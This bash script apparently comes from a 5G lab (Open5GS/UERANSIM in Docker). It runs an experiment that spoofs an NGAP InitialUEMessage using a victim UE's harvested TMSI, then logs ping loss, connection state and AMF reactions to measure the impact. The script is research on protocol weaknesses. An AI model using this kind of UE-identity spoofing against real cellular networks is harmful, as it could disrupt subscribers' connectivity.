#!/usr/bin/env bash
# Open5GS: Impact of InitialUEMessage alone (NO UEContextRelease).
#
# Questions answered:
#   - Does Holding NG / soft-rebind disturb the victim UE?
#   - CM/RRC state changes? ping loss? self-recovery via Service Request?
#
# Usage (from ngap_tester/, Git Bash):
#   bash pcap/initue_open5gs/run_contrast.sh
# Optional: SKIP_CAPTURE=1  (logs/ping only, no tcpdump)
set -uo pipefail
ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
ABS="$(cd "$(dirname "$0")" && pwd)"
cd "$ROOT"
export MSYS_NO_PATHCONV=1

AMF=o5gs-amf; SMF=o5gs-smf
GNB=ueransim-open5gs-ueransim-gnb-1
UE=ueransim-open5gs-ueransim-ue-1
NET=net-5glab
DIR=initue_open5gs
PING_TARGET=8.8.8.8
SET=1; PTR=0

ue_info(){ docker run --rm --network "$NET" curlimages/curl -s "http://172.30.0.10:9091/ue-info"; }
log(){ echo -e "\033[1;35m[initue-impact]\033[0m $*"; }
ts(){ date '+%H:%M:%S'; }

mkdir -p "$ABS"
: > "$ABS/timeline.txt"
tl(){ echo "[$(ts)] $*" | tee -a "$ABS/timeline.txt"; }

log "rebuild tester image (full Service Request NAS) ..."
docker build -t ngap-tester . >/dev/null

log "fresh UE registration ..."
docker restart "$UE" >/dev/null
sleep 14

INFO=$(ue_info)
echo "$INFO" > "$ABS/ue_info_before.json"
V=$(echo "$INFO" | sed -n 's/.*"amf_ue_ngap_id":\([0-9]*\).*/\1/p' | head -1)
TMSI_DEC=$(echo "$INFO" | sed -n 's/.*"m_tmsi":\([0-9]*\).*/\1/p' | head -1)
TMSI=$(printf '%08x' "$TMSI_DEC")
RU=$(echo "$INFO" | sed -n 's/.*"ran_ue_ngap_id":\([0-9]*\).*/\1/p' | head -1)
CM=$(echo "$INFO" | sed -n 's/.*"cm_state":"\([^"]*\)".*/\1/p' | head -1)
GNB_ID=$(echo "$INFO" | sed -n 's/.*"gnb_id":\([0-9]*\).*/\1/p' | head -1)
[ -z "$V" ] || [ -z "$TMSI" ] && { log "ABORT: no UE context"; exit 2; }

PING0=$(docker exec "$UE" ping -I uesimtun0 -c 5 -W 2 "$PING_TARGET" 2>/dev/null \
  | grep -oE '[0-9]+% packet loss' | head -1)
tl "BEFORE cm=$CM AU=$V RU=$RU TMSI=$TMSI gnb_id=$GNB_ID ping=$PING0"
log "BEFORE: cm=$CM AU=$V RU=$RU TMSI=$TMSI gnb=$GNB_ID ping=$PING0"

# Continuous ping across the InitialUE window (attribution of UP impact)
docker exec "$UE" ping -I uesimtun0 -c 40 -i 0.5 -W 2 "$PING_TARGET" \
  >"$ABS/ping_window.log" 2>&1 &
PING_PID=$!

# UE / AMF / gNB log marks
UE_MARK=$(docker logs "$UE" 2>&1 | wc -l | tr -d ' ')
AMF_MARK=$(docker logs "$AMF" 2>&1 | wc -l | tr -d ' ')
GNB_MARK=$(docker logs "$GNB" 2>&1 | wc -l | tr -d ' ')

tl "firing InitialUE only (no Release) set=$SET ptr=$PTR tmsi=$TMSI ran-ue-id=99"
if [ "${SKIP_CAPTURE:-0}" = "1" ]; then
  MSYS_NO_PATHCONV=1 docker run --rm --network "$NET" -v "$ABS:/evidence" ngap-tester \
    --config config/open5gs.json --evidence /evidence/attack.jsonl \
    initial-ue --ran-ue-id 99 --amf-set-id "$SET" --amf-pointer "$PTR" --tmsi "$TMSI" \
    2>&1 | tee "$ABS/tester_stdout.txt" | sed 's/^/  /'
else
  CFG_CORE=open5gs ./capture_attack.sh "$DIR" "$AMF" "$SMF" "$GNB" "$NET" 15 \
    -- initial-ue --ran-ue-id 99 --amf-set-id "$SET" --amf-pointer "$PTR" --tmsi "$TMSI" \
    2>&1 | tee "$ABS/capture_stdout.txt" | sed 's/^/  /'
fi

# Let UE finish any self-recovery SR before sampling
sleep 8
wait $PING_PID 2>/dev/null || true

INFO2=$(ue_info)
echo "$INFO2" > "$ABS/ue_info_after.json"
V2=$(echo "$INFO2" | sed -n 's/.*"amf_ue_ngap_id":\([0-9]*\).*/\1/p' | head -1)
RU2=$(echo "$INFO2" | sed -n 's/.*"ran_ue_ngap_id":\([0-9]*\).*/\1/p' | head -1)
CM2=$(echo "$INFO2" | sed -n 's/.*"cm_state":"\([^"]*\)".*/\1/p' | head -1)
GNB2=$(echo "$INFO2" | sed -n 's/.*"gnb_id":\([0-9]*\).*/\1/p' | head -1)
PING1=$(docker exec "$UE" ping -I uesimtun0 -c 5 -W 2 "$PING_TARGET" 2>/dev/null \
  | grep -oE '[0-9]+% packet loss' | head -1)
WIN_LOSS=$(grep -oE '[0-9]+% packet loss' "$ABS/ping_window.log" | tail -1 || true)
tl "AFTER  cm=$CM2 AU=$V2 RU=$RU2 gnb_id=$GNB2 ping=$PING1 window=$WIN_LOSS"

# Slice logs
{
  echo "======== AMF since mark ========"
  docker logs "$AMF" 2>&1 | tail -n +"$((AMF_MARK + 1))" \
    | grep -iE 'InitialUE|Holding|Service request|Service reject|Release|AMF_UE_NGAP_ID|RAN_UE|Security Context|ERROR|WARNING' \
    | sed 's/\x1b\[[0-9;]*m//g'
  echo "======== UE since mark ========"
  docker logs "$UE" 2>&1 | tail -n +"$((UE_MARK + 1))" \
    | grep -iE 'MM-|CM-|RRC-|Service |Idle|Accept|Reject|PDU|Connection|timer' \
    | sed 's/\x1b\[[0-9;]*m//g'
  echo "======== legit gNB since mark ========"
  docker logs "$GNB" 2>&1 | tail -n +"$((GNB_MARK + 1))" \
    | grep -iE 'NGAP|Release|UE Context|Error|PDU|Session' \
    | sed 's/\x1b\[[0-9;]*m//g' | tail -40
} > "$ABS/logs_since_attack.txt"

# Compact UE state machine lines for the summary
UE_LINES=$(docker logs "$UE" 2>&1 | tail -n +"$((UE_MARK + 1))" \
  | grep -iE 'UE switches to state|Service (request|Accept|Reject)|Initial Registration|PDU Session' \
  | sed 's/\x1b\[[0-9;]*m//g' | tail -25)

{
  echo "======== SUMMARY (InitialUE ONLY, no Release) ========"
  echo "BEFORE: cm=$CM AU=$V RU=$RU TMSI=$TMSI gnb=$GNB_ID ping=$PING0"
  echo "AFTER:  cm=$CM2 AU=$V2 RU=$RU2 gnb=$GNB2 ping=$PING1"
  echo "PING WINDOW (across InitialUE): $WIN_LOSS"
  echo ""
  echo "UE state-machine lines after attack:"
  echo "$UE_LINES"
  echo ""
  echo "AMF Holding / Service Request snippets:"
  grep -iE 'Holding|Service request|Service reject|No Security|AMF_UE_NGAP_ID\[' "$ABS/logs_since_attack.txt" | head -20
} | tee "$ABS/SUMMARY.txt"

log "wrote $ABS/SUMMARY.txt timeline.txt ue_info_*.json ping_window.log logs_since_attack.txt"
log "DONE — InitialUE only; no Release was sent."
